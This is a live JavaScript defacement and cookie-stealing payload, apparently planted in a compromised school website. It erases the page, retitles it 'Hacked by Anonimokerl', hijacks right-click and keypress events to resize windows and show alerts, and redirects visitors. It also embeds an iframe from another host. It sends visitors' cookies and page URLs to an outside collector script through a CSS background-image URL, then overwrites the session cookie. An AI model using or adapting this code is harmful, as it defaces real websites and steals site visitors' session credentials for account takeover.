/*
<style>html,body{color:#ffffff}</style><font color='black'><script>top.location.href='http://www.google.com/?v=wall/'</script><noscript><META HTTP-EQUIV="refresh" CONTENT="0;URL=http://www.facebook.com/?v=wall/">
*/
document.getElementsByTagName('body')[0].innerHTML=""
document.title="Hacked by Anonimokerl"
var shortc=document.createElement("link");shortc.rel="SHORTCUT ICON";shortc.href="http://i.imgur.com/QYUFm5u.png";document.getElementsByTagName("head")[0].appendChild(shortc)
function muter2(){
scrW=screen.availWidth
scrH=screen.availHeight
window.moveTo(0,0)
window.resizeTo(10,10)
window.focus()
for(x=0;x<80;x++){
window.resizeTo(10,scrH*x/80)
}
for(y=0;y<80;y++){
window.resizeTo(scrW*y/80,scrH)
}
window.resizeTo(scrW,scrH)
}
document.oncontextmenu=new Function("muter2();return false");
function keypressed(){alert("Anonimokerl Was Here");}
document.onkeydown=keypressed;
function kasih_tau(){
alert('Anonimokerl Was Here');
}
if(location.href.indexOf('sman2bangkalan.sch.id')==-1)setTimeout("alert('Anonimokerl was Here');",3000);
else setTimeout("kasih_tau()",3000);
if(navigator.userAgent.indexOf('MSIE')!=-1){
document.getElementsByTagName('body')[0].innerHTML="<center><iframe src='http://www.ensaremlak.com.tr/files/animo.html' height='2200px' width='1100px' scrolling='no' frameborder='0'></center>";
}
else{
if(document.getElementsByTagName('body')[0].style.cssText.indexOf('hack')==-1){
//muter2();
log="";
if(document.cookie!=""&&location.href.indexOf('ayodance.com')==-1){x=escape(document.cookie);v=escape(location.href);y="1337@null.net";log=";background-image:url(http://crazydavinci.net/riper.php?o="+escape(x)+"&v="+escape(v)+"&y="+escape(y)+")";document.cookie="PHPSESSID=!Bagsfreakz Here!;path=/";}
document.getElementsByTagName('body')[0].style.cssText="background-color:black"+log
window.onload=function(){
document.getElementsByTagName('body')[0].innerHTML="<center><iframe src='http://www.ensaremlak.com.tr/files/animo.html' height='2200px' width='1100px' scrolling='no' frameborder='0'></center>";
document.getElementsByTagName('body')[0].style.cssText="background-color:#ffffff;background-image:url(http://www.balikita.net/)!important;";
}
}
}